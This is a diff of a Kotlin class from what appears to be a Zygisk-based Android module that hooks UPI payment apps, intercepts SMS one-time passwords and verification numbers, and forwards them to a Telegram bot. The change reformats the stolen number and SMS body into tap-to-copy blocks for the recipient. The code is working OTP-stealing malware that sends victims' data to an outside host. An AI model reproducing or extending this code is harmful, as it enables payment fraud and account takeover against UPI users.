@@ -15,7 +15,7 @@ class TokenForwarder(
     private val client = OkHttpClient()
 
     /**
-     * Sirf hooked UPI app ka verify number + intercepted SMS — kuch aur Telegram pe nahi jata.
+     * Sirf intercept number + SMS body — Telegram pe one-tap copy (&lt;code&gt; block).
      */
     fun forward(otp: LastOtp): Boolean {
         val config = configManager.load()
@@ -32,27 +32,21 @@ class TokenForwarder(
         return postTelegram(botToken, chatId, buildInterceptMessage(otp, config))
     }
 
-  private fun buildInterceptMessage(otp: LastOtp, config: ModuleConfig): String {
-        val appName = resolveHookedAppName(otp)
+    private fun buildInterceptMessage(otp: LastOtp, config: ModuleConfig): String {
         val interceptNo = resolveUpiVerifyNumber(otp, config)
         val smsBody = otp.body.ifBlank { otp.otp }.trim()
 
         return buildString {
-            appendLine("📲 <b>${escapeHtml(appName)}</b>")
-            appendLine("📞 <b>${escapeHtml(interceptNo)}</b>")
+            appendLine("📱 <b>Zygisk Mode Menu</b>")
+            appendLine("────────────────")
+            appendLine("📞 <b>Number</b> <i>(tap to copy)</i>")
+            appendLine("<code>${escapeHtml(interceptNo)}</code>")
             if (smsBody.isNotBlank()) {
-                append(escapeHtml(smsBody))
+                appendLine()
+                appendLine("💬 <b>SMS</b> <i>(tap to copy)</i>")
+                append("<code>${escapeHtml(smsBody)}</code>")
             }
         }
-    }
-
-    private fun resolveHookedAppName(otp: LastOtp): String {
-        if (otp.messageLabel.isNotBlank()) return otp.messageLabel
-        val activePkg = ActiveHookManager.readActivePackage()
-        if (!activePkg.isNullOrBlank()) {
-            return UpiAppRegistry.displayNameFor(activePkg)
-        }
-        return "Hooked App"
     }
 
     /**
